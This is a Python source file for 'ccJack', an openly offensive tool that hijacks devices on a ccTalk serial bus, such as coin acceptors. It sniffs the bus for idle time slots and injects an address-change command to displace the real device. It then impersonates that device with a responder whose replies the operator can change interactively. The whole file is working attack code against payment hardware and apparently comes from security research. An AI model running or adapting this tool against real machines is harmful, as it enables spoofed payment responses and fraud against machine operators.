#!/usr/bin/env python
# -*- coding: utf-8 -*-

#ccJack, an automated ccTalk device hijacking tool
#Copyright (C) 2012 Nicolas Oberli
#
#This program is free software; you can redistribute it and/or
#modify it under the terms of the GNU General Public License
#as published by the Free Software Foundation; either version 2
#of the License, or (at your option) any later version.
#
#This program is distributed in the hope that it will be useful,
#but WITHOUT ANY WARRANTY; without even the implied warranty of
#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#GNU General Public License for more details.
#
#You should have received a copy of the GNU General Public License
#along with this program; if not, write to the Free Software
#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

import serial
import threading
import time
import sys
from optparse import OptionParser

from ccTalk import *

class ccResponder(threading.Thread):
    """
    This class sets a thread that listens for incoming packets and responds to them
    """

    def __init__(self, address):
        super(ccResponder, self).__init__()
        self.terminated = False
        self.address = address
        self.responses={}

    def readPacket(self):
        """
        Reads a ccTalk packet and returns it
        """
        buff=""
        while True:
            #Read the destination address
            if len(buff)<2:
                buff += ser.read(2)
            length=ord(buff[1])
            if len(buff)<length+5:
                buff += ser.read(length+3)
            try:
                ccPkt = ccTalkMessage(data=buff[:length+5])
                return ccPkt
            except:
                buff=buff[1:]
                continue

    def getResponses(self):
        return [(key, self.responses[key]) for key in self.responses] 

    def setResponse(self, header,response):
        """
        Changes the data to sent in response to a request
        """
        self.responses.update({header:response})

    def bulkSetResponse(self, responses):
        """
        Changes the data to sent in response to a request
        """
        self.responses.update(responses)

    def respond(self, request):
        """
        Responds to a request
        """
        if request.payload.header in self.responses.keys():
            resp = ccTalkMessage(header=0, source=self.address, destination=request.source, payload=self.responses[request.payload.header])
        else:
            resp = ccTalkMessage(header=0, source=self.address, destination=request.source)
        for byte in resp.raw():
            ser.write(byte)
            ser.flush()
            ser.read(1)

    def run(self):
        global ser
        while not self.terminated:
            pkt = self.readPacket()
            # The packet is for the responder
            if pkt.destination==self.address:
                # Wait 10ms to simulate the device
                time.sleep(0.01)
                self.respond(pkt)

    def stop(self):
        self.terminated = True



class serialTimerReader(threading.Thread):
    """
    This class defines a thread that grabs data on a ccTalk bus as well as the blank
    times to determine if injection is possible
    """

    def __init__(self):
        super(serialTimerReader, self).__init__()
        self.terminated = False
        self.data=""
        self.times=[]
    
    def run(self):
        global ser
        bytesToRead=0
        while not self.terminated:
            start = time.clock()
            while ser.inWaiting() == 0 and not self.terminated:
                time.sleep(0.001)
            elapsed = round(time.clock()-start,3)
            # We'll take at least 20 miliseconds to wait and send our data 
            if elapsed >= 0.02:
                self.times.append(elapsed)
            self.data = self.data + ser.read(ser.inWaiting())

    def stop(self):
        self.terminated = True

    def getData(self):
        return self.data

    def getTimes(self):
        return self.times


def enterBitBang():
    """
    Enters binary bitbang mode on the bus pirate
    """
    # Enter bitbang mode
    for i in xrange(20):
        ser.write("\x00")
    if "BBIO1" not in ser.read(5):
        print "Could not get into bbIO mode"
        sys.exit(0)
        
    # Enter UART mode
    ser.write("\x03")
    #Baud rate : 9600
    ser.write(chr(0b01100100))
    ser.read(1)
    #Peripherals : power ON / pullup ON
    ser.write(chr(0b01001100))
    ser.read(1)
    #Start UART bridge
    ser.write(chr(0b00001111))
    ser.read(1)


def leaveBitBang():
    """
    Leave the binary bitbang mode on the bus pirate
    """
    # Leave UART mode
    ser.write("\x00")
    # Leave bitbang mode
    ser.write("\x0f")


def injectMessage(header, data='', source=1, destination=2):
    """
    Waits for a silence on the ccTalk bus, then sends a packet"
    """
    request = ccTalkMessage(source=source, destination=destination, header=header, payload=data)
    bytesToRead=0
    sent=False
    while not sent:
        start = time.clock()
        while bytesToRead == 0 and not sent:
            bytesToRead = ser.inWaiting()
            if time.clock()-start >= 0.01:
                ser.write(request.raw())
                ser.flush()
                ser.read(len(request.raw()))
                sent=True
                break
        bytesToRead=0
    print "[*] Request sent"

if __name__ == '__main__':

    parser = OptionParser()
    parser.add_option("-i", "--interface", help="Serial port to use", metavar="DEVICE", dest="serPort")
    parser.add_option("-b", "--bus-pirate", help="Use this switch to tell the serial port is a bus pirate", dest="busPirate", action="store_true", default=False)
    parser.add_option("-s", "--source", type="int", help="Source address of the device to hijack", metavar="SOURCE", dest="source", default=2)
    parser.add_option("-d", "--destination", type="int", help="Destination address of the device to hijack", metavar="DESTINATION", dest="destination", default=42)
    parser.add_option("-t", "--time", help="Time to listen for packets", type="int", metavar="TIME", dest="sniffTime", default=5)
    parser.add_option("-r", "--read", help="File to read responses from", metavar="FILE", dest="inputFile")

    (options, args) = parser.parse_args()

    if options.serPort is None:
        print "Error, no serial port specified"
        sys.exit()
    else:
        try:
            if options.busPirate:
                ser=serial.Serial(options.serPort, 115200)
                enterBitBang()
            else:
                ser=serial.Serial(options.serPort, 9600)
        except serial.SerialException, e:
            print e.message
            sys.exit()

    # main loop
    reader = serialTimerReader()
    reader.start()
    print "[*] Serial timer reader running for ",options.sniffTime, " seconds..."

    time.sleep(options.sniffTime)
    print "[*] Stopping timer reader..."

    reader.stop()
    reader.join()

    times = reader.getTimes()
    
    try:

        if len(times)>0:

            print "[*] Time slots found, ready for injection"

            # We instanciate the responder to load the responses
            responder = ccResponder(int(options.source))

            ccPkts=[]

            # If input file is provided, read responses from there
            if options.inputFile is not None:
                try:
                    fd = open(options.inputFile, "rb")
                    data = fd.read()
                    fd.close()
                    ccPkts += parseMessages(data)[1]
                except:
                    print "[!] Data file error"

            # Read responses from the initial sniff
            ccPkts += parseMessages(reader.getData())[1]

            for i in range(len(ccPkts)):
                if ccPkts[i].payload.header==0:
                    responder.setResponse(ccPkts[i-1].payload.header, ccPkts[i].getPayload()[1:])
            
            print "[*] Replacing device @ "+str(options.source)+" to "+str(options.destination)

            #print "[*] Checking for device to hijack"
            #injectMessage( header=254, data='', source=1, destination=int(options.destination))
            #TODO: Add check for device response

            # Send an address change request to the device
            print "[*] Changing device address to "+str(options.destination)
            injectMessage( header=251, data=chr(int(options.destination)), source=1, destination=int(options.source))


            #Totally flush the input buffer before starting replies
            ser.flushInput()
            while ser.inWaiting()>0:
                time.sleep(0.1)
            time.sleep(0.1)

            print "[*] Device successfully hijacked, starting responder thread"
            responder.start()

            while True:
                print 'Enter header value to change (q to quit, l to list current values): '
                userHeader = raw_input("Value : ")
                if userHeader == 'l':
                    for header, response in responder.getResponses():
                        print header, " : ", response.encode('hex')
                elif userHeader.isdigit():
                    userData = raw_input('Enter new data (in hex): ').decode('hex')
                    responder.setResponse(int(userHeader),userData)
                elif userHeader == 'q':
                    print "[*] Stopping responder thread"
                    responder.stop()
                    responder.join()
                    break

        else:
            print "[-] No time slots found"


    except Exception, e:
        print e

    except:
       print "" 


    print "[*] Restoring device @ " + str(options.destination) + " to " + str(options.source)
    injectMessage( header=251, data=chr(int(options.source)), source=1, destination=int(options.destination))

    if options.busPirate:
        leaveBitBang()
